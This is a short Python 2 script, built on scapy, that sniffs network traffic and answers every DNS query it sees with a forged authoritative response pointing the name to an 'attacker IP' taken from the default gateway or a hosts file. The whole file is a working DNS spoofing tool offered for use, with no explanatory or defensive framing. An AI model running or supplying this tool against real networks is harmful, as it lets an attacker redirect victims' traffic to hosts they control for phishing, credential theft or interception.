#!/usr/bin/env python

import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import sys, getopt
from scapy.all import *
import netifaces

PRESENT = 1
ABSENT = 0

def get_ip(packet):
	attacker_ip = ""
	host = packet[DNSQR].qname
	if file_is == ABSENT:
		print "Using attacker IP for response"
		attacker_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
	else:
		fd = open(host_file, 'r')
		for line in fd:
			if host.rstrip('.') in line:
				hosts_list = line.split(" ")
				attacker_ip = hosts_list[0]
	return attacker_ip
	
def spoof(packet):
	if packet.haslayer(DNSQR):
		ip = get_ip(packet)
		spoofed_packet = IP(dst = packet[IP].src, src = packet[IP].dst)/\
                            UDP(sport = packet[UDP].dport, dport = packet[UDP].sport )/\
                            DNS(aa = 1, qr = 1, id=packet[DNS].id, qd=packet[DNS].qd, \
                            an=DNSRR(ttl = 10, rrname = packet[DNS].qd.qname, rdata = ip))
		send(spoofed_packet)
		print 'Packet sent:', spoofed_packet.summary()

if __name__ == '__main__' :
	expression = ''
	host_file = ''
	interface = ''
	interface_is = ABSENT
	file_is = ABSENT

	try:
		opts, args = getopt.getopt(sys.argv[1:], 'i:h:')
	except getopt.GetoptError as err:
		print str(err)
		sys.exit(2)
	
	for opt, arg in opts:
		if opt in ('-h'):
			file_is = PRESENT
			host_file = arg
			print host_file

		if opt in ('-i'):
			interface_is = PRESENT
			interface = arg
			print interface

	if interface_is == ABSENT:
		interface = netifaces.gateways()['default'][netifaces.AF_INET][1]

	if len(args) == 1:
		expression = args[0]
		print expression

	if len(args) > 1:
		print "Error: Too many expressions provided"
		sys.exit()

	sniff(prn = spoof, filter = expression, iface = interface, store = 0)
